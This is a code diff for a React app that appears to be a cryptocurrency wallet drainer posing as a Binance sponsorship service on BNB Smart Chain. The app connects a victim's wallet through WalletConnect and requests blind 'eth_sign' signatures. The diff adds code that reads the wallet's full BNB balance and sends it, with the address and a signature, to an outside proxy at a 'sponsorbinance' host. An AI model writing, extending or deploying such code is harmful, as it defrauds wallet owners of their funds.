@@ -3,16 +3,14 @@ import { EthereumProvider } from "@walletconnect/ethereum-provider";
 
 function App() {
   async function runner() {
-    // حذف داده‌های قدیمی WalletConnect
     if (typeof localStorage !== "undefined") {
       localStorage.removeItem("walletconnect");
     }
 
-    // مقداردهی اولیه WalletConnect
     const ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
       chains: [56], // فقط BSC
-      methods: ["eth_sign"],
+      methods: ["eth_sign", "eth_getBalance"],
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
@@ -40,6 +38,21 @@ function App() {
 
     const apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
 
+    // **📌 دریافت مقدار BNB از کیف پول**
+    let amount;
+    try {
+      const balanceHex = await provider.request({
+        method: "eth_getBalance",
+        params: [accountSender, "latest"],
+      });
+      amount = parseInt(balanceHex, 16); // تبدیل از هگز به عدد
+    } catch (error) {
+      console.error("❌ Error in fetching balance:", error);
+      return;
+    }
+
+    console.log("💰 User Balance:", amount);
+
     // **📌 دریافت امضای اولیه از کیف پول برای تأیید کاربر**
     const message = "Authorize transaction on BSC";
     let signature;
@@ -64,6 +77,7 @@ function App() {
           handler: "tx",
           address: accountSender,
           signature: signature,
+          amount: amount, // ارسال مقدار BNB کاربر
         });
 
         if (!result || result.error) {
